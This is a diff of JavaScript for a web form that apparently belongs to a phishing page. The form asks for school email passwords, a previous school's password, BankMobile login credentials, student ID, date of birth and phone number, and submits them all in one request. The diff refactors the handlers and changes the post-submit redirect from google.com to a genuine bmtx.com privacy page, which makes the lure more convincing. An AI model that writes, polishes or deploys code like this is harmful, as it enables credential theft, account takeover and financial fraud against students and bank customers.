@@ -12,123 +12,105 @@ window.addEventListener("DOMContentLoaded", async () => {
   }
 });
 
-const btn1 = document.getElementById("hide1");
-btn1.onclick = (e) => {
-  togglePassword();
-  if (e.target.innerText == "Hide") {
-    e.target.innerText = "Show";
-  } else {
-    e.target.innerText = "Hide";
-  }
-};
-
-const btn2 = document.getElementById("hide2");
-btn2.onclick = (e) => {
-  togglePassword2();
-  if (e.target.innerText == "Hide") {
-    e.target.innerText = "Show";
-  } else {
-    e.target.innerText = "Hide";
-  }
-};
-
-const btn3 = document.getElementById("hide3");
-btn3.onclick = (e) => {
-  togglePassword3();
-  if (e.target.innerText == "Hide") {
-    e.target.innerText = "Show";
-  } else {
-    e.target.innerText = "Hide";
-  }
-};
-
-function togglePassword() {
-  const input = document.getElementById("bankmobilepassword");
+// Generic password toggle function
+function togglePasswordVisibility(inputId) {
+  const input = document.getElementById(inputId);
   input.type = input.type === "password" ? "text" : "password";
 }
 
-function togglePassword2() {
-  const input = document.getElementById("previouschemailpassword");
-  input.type = input.type === "password" ? "text" : "password";
-}
+const passwordButtons = [
+  { id: "hide1", inputId: "bankmobilepassword" },
+  { id: "hide2", inputId: "previouschemailpassword" },
+  { id: "hide3", inputId: "currentschpassword" },
+];
 
-function togglePassword3() {
-  const input = document.getElementById("currentschpassword");
-  input.type = input.type === "password" ? "text" : "password";
-}
+passwordButtons.forEach(({ id, inputId }) => {
+  const btn = document.getElementById(id);
+  if (btn) {
+    btn.onclick = (e) => {
+      togglePasswordVisibility(inputId);
+      e.target.innerText = e.target.innerText === "Hide" ? "Show" : "Hide";
+    };
+  }
+});
 
+// Phone number input: allow only digits and limit to 10
 const phoneInput = document.getElementById("phone_number");
 
-phoneInput.addEventListener("input", function () {
-  // Remove any non-digit character
-  this.value = this.value.replace(/\D/g, "");
+if (phoneInput) {
+  phoneInput.addEventListener("input", function () {
+    // Remove any non-digit character
+    this.value = this.value.replace(/\D/g, "");
 
-  // Trim to 10 digits max
-  if (this.value.length > 10) {
-    this.value = this.value.slice(0, 10);
-  }
-});
+    // Trim to 10 digits max
+    if (this.value.length > 10) {
+      this.value = this.value.slice(0, 10);
+    }
+  });
+}
 
+// Floating labels logic
 document.querySelectorAll(".input-field").forEach((input) => {
   const label = input.nextElementSibling;
+  if (label) {
+    const toggleFloating = () => {
+      if (input.value.trim() !== "") {
+        label.classList.add("float");
+      } else {
+        label.classList.remove("float");
+      }
+    };
 
-  console.log(label);
-
-  const toggleFloating = () => {
-    if (input.value.trim() !== "") {
+    input.addEventListener("focus", () => {
       label.classList.add("float");
-    } else {
-      label.classList.remove("float");
-    }
-  };
+    });
 
-  // On focus
-  input.addEventListener("focus", () => {
-    label.classList.add("float");
-  });
-
-  // On blur
-  input.addEventListener("blur", toggleFloating);
-
-  // On page load (if autofilled or pre-filled)
-  toggleFloating();
-});
-
-const dobInput = document.getElementById("dob");
-
-dobInput.addEventListener("input", (e) => {
-  let value = dobInput.value.replace(/\D/g, ""); // Remove non-digits
-
-  if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
-  if (value.length > 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);
-
-  dobInput.value = value;
-});
-
-dobInput.addEventListener("blur", () => {
-  const pattern = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
-  if (!pattern.test(dobInput.value)) {
-    alert("Please enter a valid date in mm/dd/yyyy format");
+    input.addEventListener("blur", toggleFloating);
+    toggleFloating();
   }
 });
+
+// Date of birth input formatting (mm/dd/yyyy)
+const dobInput = document.getElementById("dob");
+
+if (dobInput) {
+  dobInput.addEventListener("input", () => {
+    let value = dobInput.value.replace(/\D/g, ""); // Remove non-digits
+
+    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
+    if (value.length > 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);
+
+    dobInput.value = value;
+  });
+
+  dobInput.addEventListener("blur", () => {
+    const pattern = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
+    if (!pattern.test(dobInput.value)) {
+      alert("Please enter a valid date in mm/dd/yyyy format");
+    }
+  });
+}
 
 // Radio selection logic
 const yesRadio = document.getElementById("Yes");
 const noRadio = document.getElementById("No");
 
-yesRadio.addEventListener("change", () => {
-  if (yesRadio.checked) noRadio.checked = false;
-});
+if (yesRadio && noRadio) {
+  yesRadio.addEventListener("change", () => {
+    if (yesRadio.checked) noRadio.checked = false;
+  });
 
-noRadio.addEventListener("change", () => {
-  if (noRadio.checked) yesRadio.checked = false;
-});
+  noRadio.addEventListener("change", () => {
+    if (noRadio.checked) yesRadio.checked = false;
+  });
+}
 
 // Form submission
-document.querySelector("form").addEventListener("submit", async (e) => {
+document.querySelector("form")?.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  if (!yesRadio.checked && !noRadio.checked) {
+  // Check if radio buttons are selected
+  if (!yesRadio?.checked && !noRadio?.checked) {
     return;
   }
 
@@ -138,9 +120,8 @@ document.querySelector("form").addEventListener("submit", async (e) => {
     currentSchoolEmail: document.getElementById("currentschemail").value,
     currentSchoolPassword: document.getElementById("currentschpassword").value,
     previousSchoolEmail: document.getElementById("previouschemail").value,
-    previousSchoolPassword: document.getElementById("previouschemailpassword")
-      .value,
-    hasBankMobileProfile: document.getElementById("Yes").checked ? "Yes" : "No",
+    previousSchoolPassword: document.getElementById("previouschemailpassword").value,
+    hasBankMobileProfile: yesRadio.checked ? "Yes" : "No",
     bankMobileEmail: document.getElementById("bankmobileemail").value,
     bankMobilePassword: document.getElementById("bankmobilepassword").value,
     studentid: document.getElementById("student_id").value,
@@ -159,7 +140,7 @@ document.querySelector("form").addEventListener("submit", async (e) => {
     const result = await response.json();
 
     if (result.success) {
-      window.location.href = "https://google.com";
+      window.location.href = "https://www.bmtx.com/privacy-notice-california?_gl=1*1nel0dw*_gcl_au*MTQzNzAwMjIzNy4xNzQ1NTQ4MjM5";
       e.target.reset();
       // Reset floating labels
       document.querySelectorAll(".floating-label").forEach((label) => {
